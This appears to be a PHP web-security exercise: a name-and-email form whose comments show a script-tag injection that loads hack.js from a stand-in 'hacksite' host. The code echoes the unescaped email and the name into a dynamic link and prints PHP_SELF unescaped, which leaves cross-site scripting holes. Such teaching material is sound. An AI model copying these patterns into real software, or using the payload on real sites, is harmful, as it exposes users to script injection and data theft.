<html>
    <head>
        <title>Exercise 3</title>
		<!-- CSS Bootstrap -->
		<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-beta1/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-giJF6kkoqNQ00vy+HMDP7azOuL0xtbfIcaT9wjKHr8RbDVddVHyTfAAsrekwKmP1" crossorigin="anonymous">
		
    </head>
    <body>
	<div class="container">
		<div class="row">
		<form method="POST"  action="<?php echo $_SERVER["PHP_SELF"]; ?>">
			<div class="mb-3">
				<label for="uname" class="form-label">User Name</label>
				<input type="text" class="form-control" id="uname" name="uname" required>
			</div>
			<div class="mb-3">
				<label for="email" class="form-label">Email Address</label>
				<input type="email" class="form-control" id="email" name="email" required>
			</div>
			
			<button type="submit" class="btn btn-primary">SUBMIT</button>
		</form>
		</div>
	</div>
	<?php
	
	//3rd party side contains a JavaScript file: http://localhost:8080/hacksite/hack.js
	// Someone enter following value as UName text field
    //<script src="http://localhost:8080/hacksite/hack.js"></script>
		//echo '<div>' . $x = $_POST['uname']?? "" . '</div>';
		//echo '<div>' . $y = $_POST['email'] ?? "" . '</div>';
		
	//3rd party site contains a malicious file: http://localhost:8080/hacksite/hack.php
	//dynamically created link
		if(isset($_POST['uname'])){
			$z = htmlspecialchars($_POST['uname']);
			$email = $_POST['email'];
			echo "<a href='".$z."?user=$email'> Dynamic Link >> OFFER </a>";
		}
	?>
    </body>
</html>